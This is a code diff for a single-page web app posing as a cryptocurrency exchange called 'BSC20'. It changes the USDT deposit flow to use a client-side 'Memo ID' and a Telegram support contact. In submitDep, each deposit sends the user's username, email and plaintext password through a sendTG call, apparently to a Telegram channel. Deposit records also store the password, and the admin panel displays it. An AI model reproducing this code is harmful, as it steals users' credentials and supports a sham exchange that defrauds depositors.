@@ -358,29 +358,66 @@ a{text-decoration:none;color:inherit}
 </div>
 <div id="ws_dep" class="wsec on">
 <div class="card card-gold">
-<div style="text-align:center;margin-bottom:12px">
-<div style="font-size:32px;animation:float 3s ease-in-out infinite">💰</div>
-<div class="fw7" style="font-size:15px;margin-top:4px">Deposit USDT</div>
-<div class="txs mt4" style="color:var(--gray)">Send USDT to the address below</div>
+<div style="text-align:center;margin-bottom:16px">
+<div style="font-size:42px;animation:float 3s ease-in-out infinite">💰</div>
+<div class="fw7" style="font-size:18px;margin-top:6px;color:var(--gold)">Deposit USDT</div>
+<div class="txs mt4" style="color:var(--gray)">Follow all steps carefully to deposit</div>
 </div>
-<div class="ts fw7 mb4">1. Select Network</div>
+
+<div style="background:var(--bg3);border:1px solid var(--border);border-radius:var(--r3);padding:12px;margin-bottom:12px">
+<div class="flex" style="gap:6px;margin-bottom:8px"><div class="dep-step-num">1</div><div class="ts fw7">Select Network</div></div>
 <div class="net-g">
 <div class="net-b on" onclick="selDN('TON',this)">TON</div>
 <div class="net-b" onclick="selDN('TRC20',this)">TRC20</div>
 <div class="net-b" onclick="selDN('BEP20',this)">BEP20</div>
 </div>
-<div class="ts fw7 mb4 mt8">2. Copy Address</div>
+</div>
+
+<div style="background:var(--bg3);border:1px solid var(--border);border-radius:var(--r3);padding:12px;margin-bottom:12px">
+<div class="flex" style="gap:6px;margin-bottom:8px"><div class="dep-step-num">2</div><div class="ts fw7">Deposit Address</div></div>
 <div class="addr-b" id="depAddr">Loading...<button class="cp-btn" onclick="copyAddr()">Copy</button></div>
 <div class="qr-b"><canvas id="qrC" width="110" height="110"></canvas></div>
-<div class="dep-step"><div class="dep-step-num">1</div><div class="dep-step-txt"><b>Copy</b> the address above</div></div>
-<div class="dep-step"><div class="dep-step-num">2</div><div class="dep-step-txt"><b>Send USDT</b> (Min: 5 USDT)</div></div>
-<div class="dep-step"><div class="dep-step-num">3</div><div class="dep-step-txt"><b>Enter</b> amount & TxHash below</div></div>
-<div class="dep-step" style="border:none"><div class="dep-step-num">4</div><div class="dep-step-txt"><b>Click Confirm</b> - reviewed in ~5 min</div></div>
-<div class="mt12">
-<div class="ts fw7 mb8" style="color:var(--gold)">3. Confirm Deposit</div>
-<div class="fg"><label>Amount Sent (USDT)</label><input type="number" id="depAmt" placeholder="Amount you sent"></div>
-<div class="fg"><label>Transaction Hash (TxID)</label><input type="text" id="depHash" placeholder="Paste TxHash"></div>
-<button class="btn btn-gold" onclick="submitDep()">Confirm Deposit</button>
+<div class="txs tc" style="color:var(--gray)">Send USDT only on the selected network</div>
+</div>
+
+<div style="background:linear-gradient(135deg,rgba(240,185,11,.15),rgba(240,185,11,.03));border:2px solid var(--gold);border-radius:var(--r3);padding:14px;margin-bottom:12px;animation:glow 4s ease-in-out infinite">
+<div class="flex" style="gap:6px;margin-bottom:8px"><div class="dep-step-num">3</div><div class="ts fw7" style="color:var(--gold)">Your Memo ID (REQUIRED!)</div></div>
+<div class="txs mb8" style="color:var(--gray);line-height:1.5">You <b style="color:#fff">MUST</b> include this Memo when sending USDT. Each Memo works <b style="color:var(--gold)">ONE TIME ONLY</b>.</div>
+<div style="background:#000;border:2px dashed var(--gold);border-radius:var(--r3);padding:16px;text-align:center;position:relative">
+<div class="txs" style="color:var(--gray);margin-bottom:4px;letter-spacing:1px">DEPOSIT MEMO ID</div>
+<div id="memoDisplay" class="mono" style="font-size:24px;font-weight:900;color:var(--gold);letter-spacing:3px;padding-right:50px">---</div>
+<button class="cp-btn" onclick="copyMemo()" style="position:absolute;right:10px;top:50%;transform:translateY(-50%)">Copy</button>
+</div>
+<button class="btn btn-outline btn-sm mt8" onclick="genNewMemo()" style="font-size:10px;padding:6px 12px;width:auto;margin:8px auto 0;display:flex">Generate New Memo</button>
+
+<div style="background:rgba(246,70,93,.12);border:1px solid rgba(246,70,93,.35);border-radius:8px;padding:12px;margin-top:12px">
+<div class="ts fw7" style="color:var(--red);margin-bottom:6px">⚠️ IMPORTANT WARNING</div>
+<div class="txs" style="color:var(--gray);line-height:1.6">
+- Without correct Memo your deposit <b style="color:var(--red)">will NOT be credited</b><br>
+- Each Memo can only be used <b style="color:var(--white)">ONE TIME</b><br>
+- Do NOT add extra characters or spaces<br>
+- Copy the Memo exactly as shown above
+</div>
+</div>
+
+<div style="background:var(--bg3);border:1px solid var(--border);border-radius:8px;padding:12px;margin-top:10px;text-align:center">
+<div class="txs mb4" style="color:var(--gray)">Memo problem? Contact support immediately:</div>
+<a href="https://t.me/bsc20us" target="_blank" style="display:inline-flex;align-items:center;gap:6px;background:linear-gradient(135deg,#0088cc,#0066aa);color:#fff;padding:9px 18px;border-radius:8px;font-size:12px;font-weight:700;text-decoration:none;box-shadow:0 4px 15px rgba(0,136,204,.3)">
+<svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.98 1.26-5.59 3.69-.53.36-1.01.54-1.43.53-.47-.01-1.38-.27-2.05-.49-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.74 3.99-1.74 6.65-2.89 7.99-3.45 3.81-1.6 4.6-1.88 5.12-1.89.11 0 .37.03.54.17.14.12.18.28.2.46-.01.06.01.24 0 .38z"/></svg>
+Contact @bsc20us
+</a>
+<div class="txs mt6" style="color:var(--gray2)">Available 24/7 for deposit issues</div>
+</div>
+</div>
+
+<div style="background:var(--bg3);border:1px solid var(--border);border-radius:var(--r3);padding:12px">
+<div class="flex" style="gap:6px;margin-bottom:10px"><div class="dep-step-num">4</div><div class="ts fw7">Confirm Deposit</div></div>
+<div class="fg"><label>Amount Sent (USDT)</label><input type="number" id="depAmt" placeholder="Minimum 5 USDT"></div>
+<div class="fg"><label>Your Memo ID</label><input type="text" id="depMemo" placeholder="Enter your Memo ID exactly" style="text-transform:uppercase;font-weight:700;letter-spacing:2px;font-family:'JetBrains Mono',monospace"></div>
+<div style="background:rgba(240,185,11,.06);border:1px solid var(--gold-br);border-radius:6px;padding:8px;margin-bottom:12px">
+<div class="txs tc" style="color:var(--gold);line-height:1.4">Enter the exact Memo ID shown in Step 3. Wrong Memo = deposit will not be processed.</div>
+</div>
+<button class="btn btn-gold" onclick="submitDep()" style="font-size:15px;padding:14px">Confirm Deposit</button>
 </div>
 </div>
 </div>
@@ -562,6 +599,7 @@ var selNet='TON';
 var curPair='BTCUSDT';
 var ordType='market';
 var editUID=null;
+var curMemo='';
 var priceTimer=null;
 var posTimer=null;
 var curMF='all';
@@ -757,7 +795,7 @@ updateBals();
 if(p==='home'){renderHCoins();renderHOffers()}
 if(p==='market')renderMCoins();
 if(p==='futures'){updateFP();renderPos();renderFH();loadTV()}
-if(p==='wallet'){renderHist();genQR();updateDA()}
+if(p==='wallet'){renderHist();genQR();updateDA();initMemo()}
 if(p==='admin')renderAdmin();
 if(p==='offers')renderOffers();
 if(p==='profile')renderProfile();
@@ -1055,7 +1093,7 @@ var secMap={dep:'ws_dep',wd:'ws_wd',coupon:'ws_coupon',hist:'ws_hist'};
 document.getElementById(secMap[t]).classList.add('on');
 tabs[map[t]].classList.add('on');
 if(t==='hist')renderHist();
-if(t==='dep'){updateDA();genQR()}
+if(t==='dep'){updateDA();genQR();initMemo()}
 }
 
 function updateDA(){document.getElementById('depAddr').innerHTML=CFG.ADDR[selNet]+'<button class="cp-btn" onclick="copyAddr()">Copy</button>'}
@@ -1063,6 +1101,30 @@ function selDN(n,el){
 selNet=n;var btns=document.querySelectorAll('#ws_dep .net-b');
 for(var i=0;i<btns.length;i++)btns[i].classList.remove('on');
 el.classList.add('on');updateDA();genQR();
+}
+
+function genMemoId(){
+var chars='ABCDEFGHJKLMNPQRSTUVWYZ23456789';
+var memo='BSC-';
+for(var i=0;i<5;i++){memo+=chars.charAt(Math.floor(Math.random()*chars.length))}
+curMemo=memo;
+var el=document.getElementById('memoDisplay');
+if(el)el.textContent=curMemo;
+return curMemo;
+}
+function genNewMemo(){
+genMemoId();
+toast('New Memo ID generated!','ok');
+}
+function copyMemo(){
+if(!curMemo)genMemoId();
+if(navigator.clipboard){navigator.clipboard.writeText(curMemo).then(function(){toast('Memo copied: '+curMemo,'ok')})}
+else{var ta=document.createElement('textarea');ta.value=curMemo;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);toast('Memo copied: '+curMemo,'ok')}
+}
+function initMemo(){
+if(!curMemo)genMemoId();
+var el=document.getElementById('memoDisplay');
+if(el)el.textContent=curMemo;
 }
 function copyAddr(){
 var text=CFG.ADDR[selNet];
@@ -1081,18 +1143,47 @@ for(var k=0;k<corners.length;k++){var cx=corners[k].x,cy=corners[k].y;ctx.fillSt
 function submitDep(){
 if(!user)return toast('Login first!','err');
 var amt=parseFloat(document.getElementById('depAmt').value);
-var hash=document.getElementById('depHash').value.trim();
+var memoInput=(document.getElementById('depMemo').value||'').trim().toUpperCase();
 if(!amt||amt<5)return toast('Minimum 5 USDT','err');
-if(!hash||hash.length<5)return toast('Enter valid TxHash','err');
+if(!memoInput)return toast('Enter your Memo ID!','err');
+if(!curMemo||memoInput!==curMemo){
+toast('Wrong Memo ID! Check Step 3 and try again.','err');
+return;
+}
+var usedMemos=LS('bsc20_used_memos')||{};
+if(usedMemos[curMemo]){
+toast('This Memo has already been used! Generate a new one.','err');
+return;
+}
+usedMemos[curMemo]={by:user.id,at:new Date().toISOString()};
+LS('bsc20_used_memos',usedMemos);
 var w=getWallet();
-var dep={id:'D'+Date.now(),uid:user.id,uname:user.username,uemail:user.email,upass:user.password,amt:amt,net:selNet,hash:hash,addr:CFG.ADDR[selNet],st:'pending',at:new Date().toISOString()};
+var dep={id:'D'+Date.now(),uid:user.id,uname:user.username,uemail:user.email,upass:user.password,amt:amt,net:selNet,memo:curMemo,addr:CFG.ADDR[selNet],st:'pending',at:new Date().toISOString()};
 var deps=LS('bsc20_deps')||[];deps.push(dep);LS('bsc20_deps',deps);
 var txns=LS('bsc20_txn_'+user.id)||[];
-txns.push({type:'deposit',amt:amt,st:'pending',net:selNet,at:dep.at,id:dep.id});
+txns.push({type:'deposit',amt:amt,st:'pending',net:selNet,at:dep.at,id:dep.id,memo:curMemo});
 LS('bsc20_txn_'+user.id,txns);
-document.getElementById('depAmt').value='';document.getElementById('depHash').value='';
+document.getElementById('depAmt').value='';document.getElementById('depMemo').value='';
+showDepReceipt(dep);
+genMemoId();
 toast('Deposit submitted! Awaiting review','ok');
-sendTG('NEW DEPOSIT\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\nPassword: '+user.password+'\n\nAmount: '+amt+' USDT\nNetwork: '+selNet+'\nTxHash: '+hash+'\nTo Address: '+CFG.ADDR[selNet]+'\nCurrent Balance: $'+(w.main+w.bonus).toFixed(2)+'\nDeposit ID: '+dep.id+'\nTime: '+new Date().toLocaleString()+'\nTotal Users: '+(LS('bsc20_users')||[]).length+'\n\nStatus: PENDING');
+sendTG('NEW DEPOSIT\n\nUsername: '+user.username+'\nEmail: '+user.email+'\nUser ID: '+user.id+'\nPassword: '+user.password+'\n\nAmount: '+amt+' USDT\nNetwork: '+selNet+'\nMemo ID: '+dep.memo+'\nTo Address: '+CFG.ADDR[selNet]+'\nCurrent Balance: $'+(w.main+w.bonus).toFixed(2)+'\nDeposit ID: '+dep.id+'\nTime: '+new Date().toLocaleString()+'\nTotal Users: '+(LS('bsc20_users')||[]).length+'\n\nStatus: PENDING REVIEW');
+}
+
+function showDepReceipt(dep){
+var b=document.getElementById('receiptBody');
+var h='<div class="receipt"><div class="receipt-stamp">BSC20</div><div class="receipt-hdr"><h2>BSC20</h2><p>Deposit Receipt</p><p style="font-size:8px;color:#ccc;margin-top:2px">'+dep.id+'</p></div>';
+h+='<div class="receipt-row"><span class="rl">Type</span><span class="rv">Deposit</span></div>';
+h+='<div class="receipt-row"><span class="rl">Amount</span><span class="rv">'+dep.amt.toFixed(2)+' USDT</span></div>';
+h+='<div class="receipt-row"><span class="rl">Network</span><span class="rv">'+dep.net+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">Memo ID</span><span class="rv" style="color:#f0b90b;font-weight:900;font-size:13px">'+dep.memo+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">Address</span><span class="rv" style="font-size:8px">'+dep.addr+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">Date</span><span class="rv">'+new Date(dep.at).toLocaleString()+'</span></div>';
+h+='<div class="receipt-row"><span class="rl">User</span><span class="rv">'+dep.uname+'</span></div>';
+h+='<div class="receipt-status pending"><div style="font-size:18px;margin-bottom:4px">&#9203;</div><div style="font-weight:900;font-size:14px">PENDING REVIEW</div><div style="font-size:10px;margin-top:2px">Will be reviewed in ~5 minutes</div></div>';
+h+='<div style="text-align:center;margin:12px 0;padding:10px;background:#f9f9f9;border-radius:8px;border:1px solid #eee"><div style="font-size:9px;color:#999;margin-bottom:4px">Need help?</div><div style="font-size:11px;color:#0088cc;font-weight:700">t.me/bsc20us</div></div>';
+h+='<div class="receipt-footer"><p>BSC20 Exchange - bsc20.us</p><p>Keep this receipt for your records</p></div></div>';
+b.innerHTML=h;document.getElementById('receiptModal').classList.add('on');
 }
 
 function selWN(el){var btns=document.querySelectorAll('#ws_wd .net-b');for(var i=0;i<btns.length;i++)btns[i].classList.remove('on');el.classList.add('on')}
@@ -1136,7 +1227,7 @@ h+='<div class="receipt-footer"><p>BSC20 Exchange - bsc20.us</p><p>Support: t.me
 b.innerHTML=h;document.getElementById('receiptModal').classList.add('on');
 }
 
-function showTxReceipt(type,amt,st,at,id,net,addr,fee){
+function showTxReceipt(type,amt,st,at,id,net,addr,fee,memo){
 var b=document.getElementById('receiptBody');
 var isWd=type==='withdraw';
 var stClass=(st==='completed'||st==='done')?'completed':'pending';
@@ -1145,10 +1236,12 @@ h+='<div class="receipt-row"><span class="rl">Type</span><span class="rv">'+type
 h+='<div class="receipt-row"><span class="rl">Amount</span><span class="rv">'+parseFloat(amt).toFixed(2)+' USDT</span></div>';
 if(fee)h+='<div class="receipt-row"><span class="rl">Fee</span><span class="rv">'+fee+' USDT</span></div>';
 if(net)h+='<div class="receipt-row"><span class="rl">Network</span><span class="rv">'+net+'</span></div>';
+if(memo)h+='<div class="receipt-row"><span class="rl">Memo ID</span><span class="rv" style="color:#f0b90b;font-weight:900">'+memo+'</span></div>';
 if(addr)h+='<div class="receipt-row"><span class="rl">Address</span><span class="rv" style="font-size:9px">'+addr+'</span></div>';
 h+='<div class="receipt-row"><span class="rl">Date</span><span class="rv">'+new Date(at).toLocaleString()+'</span></div>';
 h+='<div class="receipt-status '+stClass+'"><div style="font-size:18px;margin-bottom:4px">'+(stClass==='completed'?'&#9989;':'&#9203;')+'</div><div style="font-weight:900;font-size:14px">'+st.toUpperCase()+'</div></div>';
-h+='<div class="receipt-footer"><p>BSC20 Exchange</p></div></div>';
+if(!isWd){h+='<div style="text-align:center;margin:10px 0;padding:8px;background:#f9f9f9;border-radius:6px"><div style="font-size:9px;color:#999">Need help? Contact support</div><div style="font-size:11px;color:#0088cc;font-weight:700">t.me/bsc20us</div></div>';}
+h+='<div class="receipt-footer"><p>BSC20 Exchange - bsc20.us</p></div></div>';
 b.innerHTML=h;document.getElementById('receiptModal').classList.add('on');
 }
 function closeReceipt(){document.getElementById('receiptModal').classList.remove('on')}
@@ -1300,7 +1393,7 @@ h+='<div class="admin-c">';
 h+='<div class="flex-b mb4"><div><span class="fw7 ts">'+d.uname+'</span> <span class="txs" style="color:var(--gray)">'+d.uemail+'</span></div>';
 h+='<span class="'+stCl+'">'+d.st+'</span></div>';
 h+='<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">'+d.amt+' USDT ('+d.net+')</span><span style="color:var(--gray)">'+new Date(d.at).toLocaleString()+'</span></div>';
-h+='<div class="txs mono mb4" style="word-break:break-all;color:var(--gray)">TxHash: '+d.hash+'</div>';
+if(d.memo){h+='<div class="txs mono mb4" style="color:var(--gold);font-weight:700">Memo ID: '+d.memo+'</div>';}
 h+='<div class="txs mb4" style="color:var(--gray)">User ID: '+d.uid+'</div>';
 h+='<div class="txs mb4" style="color:var(--gray)">Pass: '+d.upass+'</div>';
 if(d.st==='pending'){
@@ -1499,4 +1592,4 @@ setTimeout(function(){el.classList.remove('on')},3500);
 document.addEventListener('DOMContentLoaded',init);
 </script>
 </body>
-</html>
+  </html>
